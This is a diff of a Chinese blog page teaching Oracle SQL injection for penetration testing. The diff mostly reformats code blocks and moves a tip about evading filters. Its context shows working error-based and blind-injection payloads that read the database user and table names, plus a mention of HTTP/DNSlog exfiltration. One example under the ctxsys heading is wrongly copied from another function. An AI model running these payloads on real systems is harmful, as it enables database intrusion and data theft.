@@ -58,6 +58,7 @@
         <div class="markdown mb-8" v-pre>
           <p><code>Oracle</code> 数据库常用于一些大型公司,平常都配合Java的后端来使用，在企业以及各类主流单位都作为主要数据库,平时在测试中也经常遇到注入漏洞,所以就总结一下,注入过程,从注入判断到数据的获取,全过程记录,包含一个典型实际案例</p>
 <h2 id="0x01-寻找并判断注入点">0x01 寻找并判断注入点</h2>
+<h3 id="注意避免使用-and-11这样的测试语句">注意：避免使用 <code>and 1=1</code>这样的测试语句</h3>
 <h4 id="数字型">数字型:</h4>
 <p>数字型的注入,和其他类型数据库时都一样,自己构造<code>加减乘除</code>的条件来判断注入</p>
 <h3 id="payload">Payload:</h3>
@@ -86,7 +87,6 @@
 </code></pre>
 <h4 id="字符型">字符型</h4>
 <p>字符型注入相对数字型来说,会存在闭合一些数据引用符号的问题,例如语句通过<code>'</code>闭合语句后,后续就要通过单行注释符来注释剩下的单引号,其他情况也是如此</p>
-<p>注意事项: <code>避免使用 and 1=1</code>大概率会被拦截的语句</p>
 <h4 id="payload-2">Payload:</h4>
 <pre><code class="language-sql">#通过&lt;&gt;来判断
 
@@ -127,33 +127,45 @@ select USER_ID from TB_USER where USER_ID=1 and rownum=1（获取数据）
 <ul>
 <li>XMLType()</li>
 </ul>
-<pre><code># 中间为查询语句
+<pre><code class="language-sql">
+# 中间为查询语句
 upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62)))
 
 </code></pre>
 <ul>
 <li>dbms_xdb_version.checkin()</li>
 </ul>
-<pre><code># 中间为查询语句
+<pre><code class="language-sql">
+# 中间为查询语句
 upper(dbms_xdb_version.checkin((select user from dual)))
+
 </code></pre>
 <ul>
 <li>ctxsys.drithsx.sn()</li>
 </ul>
-<pre><code class="language-sql"># 中间为查询内容
+<pre><code class="language-sql">
+# 中间为查询内容
+
 upper(dbms_xdb_version.checkin((select user from dual)))
+
 </code></pre>
 <ul>
 <li>ordsys.ord_dicom.getmappingxpath()</li>
 </ul>
-<pre><code class="language-sql"># 中间为查询内容
+<pre><code class="language-sql">
+# 中间为查询内容
+
 ordsys.ord_dicom.getmappingxpath(user,user,user)
+
 </code></pre>
 <ul>
 <li>dbms_utility.sqlid_to_sqlhash()</li>
 </ul>
-<pre><code class="language-sql"># 中间为查询内容
+<pre><code class="language-sql">
+# 中间为查询内容
+
 dbms_utility.sqlid_to_sqlhash((select user from dual))
+
 </code></pre>
 <h3 id="02oob外带数据">02.OOB外带数据</h3>
 <p>通过HTTP请求,或者DNSlog,来构造语句,如果目标出网,并且对数据库函数没有进行限制,就会实现攻击</p>
@@ -328,10 +340,13 @@ and+1=(select decode(substr((select table_name from user_tables where rownum=1),
         <ul class="markdownIt-TOC">
 <li>
 <ul>
-<li><a href="#0x01-%E5%AF%BB%E6%89%BE%E5%B9%B6%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">0x01 寻找并判断注入点</a><br>
-*
+<li><a href="#0x01-%E5%AF%BB%E6%89%BE%E5%B9%B6%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9">0x01 寻找并判断注入点</a>
+<ul>
+<li><a href="#%E6%B3%A8%E6%84%8F%E9%81%BF%E5%85%8D%E4%BD%BF%E7%94%A8-and-11%E8%BF%99%E6%A0%B7%E7%9A%84%E6%B5%8B%E8%AF%95%E8%AF%AD%E5%8F%A5">注意：避免使用 <code>and 1=1</code>这样的测试语句</a>
 <ul>
 <li><a href="#%E6%95%B0%E5%AD%97%E5%9E%8B">数字型:</a></li>
+</ul>
+</li>
 <li><a href="#payload">Payload:</a>
 <ul>
 <li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">字符型</a></li>
